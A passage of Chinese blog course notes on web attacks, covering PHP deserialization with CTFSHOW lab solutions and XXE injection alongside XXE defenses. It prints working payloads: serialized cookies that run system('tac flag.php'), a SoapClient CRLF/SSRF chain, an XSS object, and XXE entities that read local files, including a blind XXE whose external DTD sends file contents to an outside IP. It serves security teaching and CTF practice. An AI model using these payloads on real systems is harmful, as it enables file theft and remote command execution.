invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-输出对象可调用__toString</span><br><span class="line">-无代码通过原生类<span class="built_in">Exception</span></span><br><span class="line">-<span class="built_in">Exception</span>使用查询编写利用</span><br><span class="line">-通过访问触发输出产生XSS漏洞</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3、CTFSHOW-259"><a href="#3、CTFSHOW-259" class="headerlink" title="3、CTFSHOW-259"></a>3、CTFSHOW-259</h3><p>-不存在的方法触发__call<br>-无代码通过原生类SoapClient<br>-SoapClient使用查询编写利用<br>-通过访问本地Flag.php获取Flag  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>60WEB攻防-PHP反序列化1</title>
      <link href="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/"/>
      <url>/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>57、PHP-反序列化-应用&amp;识别&amp;函数</li><li>58、PHP-反序列化-魔术方法&amp;触发规则</li><li>59、PHP-反序列化-联合漏洞&amp;POP链构造</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png"><br> <img src="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png"><br> <img src="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"><br> <img src="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%964.png"></p><h2 id="1、什么是反序列化操作？-类型转换"><a href="#1、什么是反序列化操作？-类型转换" class="headerlink" title="1、什么是反序列化操作？ - 类型转换"></a>1、什么是反序列化操作？ - 类型转换</h2><ul><li>PHP &amp; JavaEE &amp; Python（见图）<br>序列化：对象转换为数组或字符串等格式<br>反序列化：将数组或字符串等格式转换成对象  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()     <span class="comment">//将对象转换成一个字符串  </span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()   <span class="comment">//将字符串还原成一个对象  </span></span><br></pre></td></tr></table></figure></li></ul><h2 id="2、常见PHP魔术方法？-对象逻辑（见图）"><a href="#2、常见PHP魔术方法？-对象逻辑（见图）" class="headerlink" title="2、常见PHP魔术方法？- 对象逻辑（见图）"></a>2、常见PHP魔术方法？- 对象逻辑（见图）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(查看魔术方法的下一行的代码；构造时，有用的留下，没用的删掉。)</span><br><span class="line"><span class="title function_ invoke__">__construct</span>(): <span class="comment">//当对象new的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()：<span class="comment">//当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()执行时被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>(): <span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//当尝试以调用函数的方法调用一个对象时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//调用某个方法,若方法存在,则调用;若不存在,则会去调用__call函数。</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>(): <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//读取对象属性时,若存在,则返回属性值;若不存在，则会调用__get函数</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//设置对象的属性时,若属性存在,则赋值;若不存在,则调用__set函数。</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用</span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当对象复制完成时调用</span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br></pre></td></tr></table></figure><h2 id="3、为什么会出现安全漏洞？"><a href="#3、为什么会出现安全漏洞？" class="headerlink" title="3、为什么会出现安全漏洞？"></a>3、为什么会出现安全漏洞？</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;ipconfig&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数引用，无对象创建触发魔术方法</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br></pre></td></tr></table></figure><h2 id="4、反序列化漏洞如何利用？-POP链构造"><a href="#4、反序列化漏洞如何利用？-POP链构造" class="headerlink" title="4、反序列化漏洞如何利用？- POP链构造"></a>4、反序列化漏洞如何利用？- POP链构造</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;POP：面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，序列化攻击都在PHP魔术方法中出现可利用的漏洞，因自动调用触发漏洞，但如关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。  </p><p>-反序列化常见起点（见图）<br>-反序列化常见跳板（见图）<br>-反序列化常见终点（见图）  </p><h2 id="CTFSHOW-训练链构造"><a href="#CTFSHOW-训练链构造" class="headerlink" title="CTFSHOW-训练链构造"></a>CTFSHOW-训练链构造</h2><ul><li>254-对象引用执行逻辑</li></ul><p><code>username=xxxxxx&amp;password=xxxxxx</code></p><ul><li><p>255-反序列化变量修改1  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CODE:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Get:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">Cookie:user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></li><li><p>256-反序列化参数修改2  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CODE:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xiaodisec&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GET:username=xiaodi&amp;password=xiaodisec</span><br><span class="line">COOKIE:user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xiaodi%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>xiaodisec%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></li><li><p>257-反序列化参数修改&amp;对象调用逻辑   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CODE:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GET:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE:user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">22</span>tac+flag.php%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></li><li><p>258-反序列化参数修改&amp;对象调用逻辑&amp;正则  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CODE:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GET:username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE:user=O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>tac+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>59WEB攻防-XXE</title>
      <link href="/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/"/>
      <url>/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>54、XXE&amp;XML-原理-用途&amp;外实体&amp;安全</li><li>55、XXE&amp;XML-黑盒-格式类型&amp;数据类型</li><li>56、XXE&amp;XML-白盒-函数审计&amp;回显方案</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p><p> <img src="/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/xxe.png"></p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。XXE漏洞XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危害。  </p><p>XML 与 HTML 的主要差异：<br>XML 被设计为传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息 ，而XML旨在传输存储信息。<br>Example：网站的xml文件解析  </p><h3 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h3><p>1、获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe<br>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行  </p><h3 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h3><p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等  </p><h3 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h3><ul><li>方案1-禁用外部实体  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li>方案2-过滤用户提交的XML数据<br>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</li></ul><h2 id="XML-XXE-传输-原理-探针-利用-玩法"><a href="#XML-XXE-传输-原理-探针-利用-玩法" class="headerlink" title="XML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法"></a>XML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法</h2><h3 id="1、读取文件："><a href="#1、读取文件：" class="headerlink" title="1、读取文件："></a>1、读取文件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xiaodi [</span><br><span class="line">&lt;!ENTITY test SYSTEM  &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>1.1、带外测试：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://9v57ll.dnslog.cn&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h3 id="2、外部引用实体dtd："><a href="#2、外部引用实体dtd：" class="headerlink" title="2、外部引用实体dtd："></a>2、外部引用实体dtd：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/xiaodi.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">xiaodi.dtd</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="3、无回显读文件"><a href="#3、无回显读文件" class="headerlink" title="3、无回显读文件"></a>3、无回显读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="4、其他玩法（协议）-见参考地址"><a href="#4、其他玩法（协议）-见参考地址" class="headerlink" title="4、其他玩法（协议）-见参考地址"></a>4、其他玩法（协议）-见参考地址</h3><p><a 